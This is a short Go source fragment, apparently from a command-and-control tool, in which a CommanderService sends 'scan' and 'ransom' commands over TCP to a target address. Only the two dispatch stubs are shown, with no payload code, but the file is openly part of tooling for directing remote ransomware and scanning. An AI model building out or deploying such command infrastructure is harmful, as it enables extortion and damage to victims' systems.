package tcp

//ScanCmd is
func (c *CommanderService) ScanCmd(addr string) error {
	data := append(commandToBytes("scan"), []byte{}...)
	return sendData(addr, data)
}

//RansomCmd is
func (c *CommanderService) RansomCmd(addr string) error {
	data := append(commandToBytes("ransom"), []byte{}...)
	return sendData(addr, data)
}
